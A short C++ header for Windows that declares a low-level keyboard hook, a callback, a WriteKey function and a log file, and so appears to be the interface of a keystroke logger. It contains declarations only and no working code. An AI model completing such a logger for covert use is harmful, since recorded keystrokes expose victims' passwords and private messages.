#ifndef KEYBOARDHOOK_H
#define KEYBOARDHOOK_H

#include <windows.h>
#include <fstream>
#include <string>

extern std::ofstream logFile;

extern HHOOK _hook;

extern KBDLLHOOKSTRUCT kbdStruct;

void WriteKey(int key);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

void SetHook(std::string logFile);


#endif


